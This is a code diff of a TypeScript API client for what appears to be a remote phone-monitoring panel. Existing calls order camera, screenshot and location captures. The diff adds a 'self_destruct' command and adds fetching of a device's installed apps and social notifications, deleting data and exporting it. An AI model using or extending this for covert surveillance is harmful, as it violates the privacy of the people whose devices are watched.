@@ -86,7 +86,7 @@ export const api = {
 
   getDevice: (id: string) => request<Device>(`/device/${id}`),
 
-  createCommand: (deviceId: string, type: 'screenshot' | 'camera_front' | 'camera_back' | 'location') =>
+  createCommand: (deviceId: string, type: 'screenshot' | 'camera_front' | 'camera_back' | 'location' | 'self_destruct') =>
     request<DeviceCommand>(`/device/${deviceId}/commands`, {
       method: 'POST',
       body: JSON.stringify({ type }),
@@ -111,6 +111,32 @@ export const api = {
 
   getMedia: (deviceId: string, type?: string) =>
     request<MediaItem[]>(`/data/media/${deviceId}${type ? `?type=${type}` : ''}`),
+
+  getInstalledApps: (deviceId: string) =>
+    request<InstalledAppsResponse>(`/data/installed-apps/${deviceId}`),
+
+  getSocial: (deviceId: string) => request<NotificationItem[]>(`/data/social/${deviceId}`),
+
+  deleteData: (type: string, deviceId: string) =>
+    request<{ ok: boolean }>(`/data/${type}/${deviceId}`, { method: 'DELETE' }),
+
+  exportData: async (deviceId: string, type: string) => {
+    const token = getToken();
+    const res = await fetch(`${API_URL}/data/export/${type}/${deviceId}`, {
+      headers: token ? { Authorization: `Bearer ${token}` } : {},
+    });
+    if (!res.ok) {
+      const data = await res.json().catch(() => ({}));
+      throw new Error(data.error || 'Dışa aktarma başarısız');
+    }
+    const blob = await res.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `${type}-${deviceId.slice(0, 8)}.json`;
+    a.click();
+    URL.revokeObjectURL(url);
+  },
 
   adminStats: () => request<AdminStats>('/admin/stats'),
 
@@ -203,6 +229,28 @@ export interface MediaItem {
   type: string;
   fileUrl: string;
   timestamp: string;
+}
+
+export interface InstalledApp {
+  id: string;
+  packageName: string;
+  appName: string;
+  versionName?: string | null;
+  isInstalled: boolean;
+  updatedAt: string;
+}
+
+export interface AppChangeLog {
+  id: string;
+  packageName: string;
+  appName?: string | null;
+  action: string;
+  recordedAt: string;
+}
+
+export interface InstalledAppsResponse {
+  apps: InstalledApp[];
+  changes: AppChangeLog[];
 }
 
 export function mediaFullUrl(fileUrl: string) {
